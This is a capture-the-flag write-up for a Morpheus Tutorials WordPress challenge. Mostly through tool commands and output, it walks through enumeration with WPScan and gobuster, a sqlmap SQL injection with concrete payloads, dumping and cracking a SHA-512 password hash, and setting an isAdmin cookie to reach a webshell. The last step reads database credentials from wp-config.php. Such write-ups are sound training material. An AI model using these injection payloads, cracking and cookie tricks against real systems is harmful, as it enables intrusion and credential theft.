# Solution of [HC 0x0f](https://challenges.the-morpheus.de) from [The Morpheus Tutorials](https://the-morpheus.de)

## 1. wpscan (not necessary here)
```
$ wpscan --url http://185.244.170:20016 --enumerate users
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.4
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://185.244.192.170:20016/
[+] Started: Tue Oct  2 16:37:43 2018

[+] Interesting header: LINK: <http://185.244.192.170:20016/index.php/wp-json/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.29 (Ubuntu)
[+] XML-RPC Interface available under: http://185.244.192.170:20016/xmlrpc.php   [HTTP 405]
[+] Found an RSS Feed: http://185.244.192.170:20016/index.php/feed/   [HTTP 200]
[!] Detected 1 user from RSS feed:
+---------------+
| Name          |
+---------------+
| Administrator |
+---------------+
[!] Includes directory has directory listing enabled: http://185.244.192.170:20016/wp-includes/

[+] Enumerating WordPress version ...

[+] WordPress version 4.9 (Released on 2017-11-16) identified from advanced fingerprinting, meta generator, links opml, stylesheets numbers
[!] 10 vulnerabilities identified from the version number

[!] Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload
    Reference: https://wpvulndb.com/vulnerabilities/8966
    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092
[i] Fixed in: 4.9.1

[!] Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping
    Reference: https://wpvulndb.com/vulnerabilities/8967
    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094
[i] Fixed in: 4.9.1

[!] Title: WordPress 4.3.0-4.9 - HTML Language Attribute Escaping
    Reference: https://wpvulndb.com/vulnerabilities/8968
    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/3713ac5ebc90fb2011e98dfd691420f43da6c09a
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17093
[i] Fixed in: 4.9.1

[!] Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing
    Reference: https://wpvulndb.com/vulnerabilities/8969
    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091
[i] Fixed in: 4.9.1

[!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/9006
    Reference: https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850
    Reference: https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/ticket/42720
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776
[i] Fixed in: 4.9.2

[!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
    Reference: https://wpvulndb.com/vulnerabilities/9021
    Reference: https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
    Reference: https://github.com/quitten/doser.py
    Reference: https://thehackernews.com/2018/02/wordpress-dos-exploit.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389

[!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
    Reference: https://wpvulndb.com/vulnerabilities/9053
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
[i] Fixed in: 4.9.5

[!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
    Reference: https://wpvulndb.com/vulnerabilities/9054
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
[i] Fixed in: 4.9.5

[!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
    Reference: https://wpvulndb.com/vulnerabilities/9055
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
[i] Fixed in: 4.9.5

[!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
    Reference: https://wpvulndb.com/vulnerabilities/9100
    Reference: https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
    Reference: http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
    Reference: https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
    Reference: https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
    Reference: https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
[i] Fixed in: 4.9.7

[+] WordPress theme in use: twentyfifteen - v1.9

[+] Name: twentyfifteen - v1.9
 |  Last updated: 2018-05-17T00:00:00.000Z
 |  Location: http://185.244.192.170:20016/wp-content/themes/twentyfifteen/
 |  Readme: http://185.244.192.170:20016/wp-content/themes/twentyfifteen/readme.txt
[!] The version is out of date, the latest version is 2.0
 |  Style URL: http://185.244.192.170:20016/wp-content/themes/twentyfifteen/style.css
 |  Theme Name: Twenty Fifteen
 |  Theme URI: https://wordpress.org/themes/twentyfifteen/
 |  Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple,...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating plugins from passive detection ...
[+] No plugins found passively

[+] Enumerating usernames ...
[+] We identified the following 1 user:
    +----+---------------+------------------------------------------+
    | ID | Login         | Name                                     |
    +----+---------------+------------------------------------------+
    | 1  | Administrator | Administrator – The Morpheus Tutorials – |
    +----+---------------+------------------------------------------+

[+] Finished: Tue Oct  2 16:37:49 2018
[+] Elapsed time: 00:00:06
[+] Requests made: 132
[+] Memory used: 43.133 MB
```
The interesting bugs require you have a user. So lets continue with the enumeration.


## 2. Gobuster Enumeration
```
$ gobuster -w /opt/wordlists/directory-list-lowercase-2.3-medium.txt -u http://185.244.192.170:20016/

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://185.244.192.170:20016/
[+] Threads      : 10
[+] Wordlist     : /opt/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/wp-content (Status: 301)
/wp-includes (Status: 301)
/dev (Status: 301)
```

## 3. sqlmap
```bash
$ sqlmap --url "http://185.244.192.170:20016/dev/index.php" --data "username=&password=" --dbms=mysql --level=5 --risk=3

# vulerabilities
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (Generic comment)
    Payload: username=-9962' OR 2553=2553-- -&password=

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)
    Payload: username=' AND (SELECT * FROM (SELECT(SLEEP(5)))JGVX)#&password=
---

# --dbs
available databases [2]:
[*] information_schema
[*] wordpress

# -D wordpress --tables
Database: wordpress
[12 tables]
+-----------------------+
| devlopment            |
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+

# -D wordpress -T development --dump
Database: wordpress
Table: devlopment
[1 entry]
+----+----------+----------------------------------------------------------------------------------------------------------------------------------+
| id | username | password                                                                                                                         |
+----+----------+----------------------------------------------------------------------------------------------------------------------------------+
| 1  | rocker   | 6df0b4feed34f4c54595cab2c34ea544e03b8dcd6820548774844ad9de6abdb238ccf5eb9f7310d9c47e4c3032743656d8461a4b0c26fadb592735bd411797ba |
+----+----------+----------------------------------------------------------------------------------------------------------------------------------+
```

## 4. Crack the password hash
Recognize the hash as sha512 hash and use Hashcat to decrypt it.
```
$ hashcat -a 0 -m 1700 hash /opt/wordlists/rockyou.txt
...

6df0b4feed34f4c54595cab2c34ea544e03b8dcd6820548774844ad9de6abdb238ccf5eb9f7310d9c47e4c3032743656d8461a4b0c26fadb592735bd411797ba:whitechocolate

Session..........: hashcat
Status...........: Cracked
Hash.Type........: SHA-512
Hash.Target......: 6df0b4feed34f4c54595cab2c34ea544e03b8dcd68205487748...1797ba
Time.Started.....: Tue Oct  2 16:13:16 2018 (0 secs)
Time.Estimated...: Tue Oct  2 16:13:16 2018 (0 secs)
Guess.Base.......: File (/opt/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....: 20729.5 kH/s (8.30ms) @ Accel:128 Loops:1 Thr:256 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 294912/14344384 (2.06%)
Rejected.........: 0/294912 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Candidates.#1....: 123456 -> redsox#1
HWMon.Dev.#1.....: Temp: 43c Fan: 57% Util: 47% Core:1771MHz Mem:4006MHz Bus:16
```

The credentials are: `rocker`/`whitechocolate`

## 5. Get Shell Access
You can use the browser console to change the cookie.
Just open the console and type:
```javascript
document.cookie="isAdmin=true"
```
If you reload the page, you should get an new entry (`Shell`) in the navigation bar on the left side. After you clicked on the link, you can see the [phpbash](https://github.com/Arrexel/phpbash/blob/master/phpbash.php) webshell.

## 6. Get the Wordpress database password
Navigate one directory backwards and check the file `wp-config.php`. This is where Wordpress stores its password.

```
...
// ** MySQL Einstellungen - diese Angaben bekommst du von deinem Webhoster. ** //
/** Ersetze database_name_here mit dem Namen der Datenbank, die du verwenden möchtest. */
define('DB_NAME', 'wordpress');

/** Ersetze username_here mit deinem MySQL-Datenbank-Benutzernamen */
define('DB_USER', '0x0f');

/** Ersetze password_here mit deinem MySQL-Passwort */
define('DB_PASSWORD', '0RQ7wl51Semdbo7UhoV2');
...
```

Flag: `TMT{0RQ7wl51Semdbo7UhoV2}`
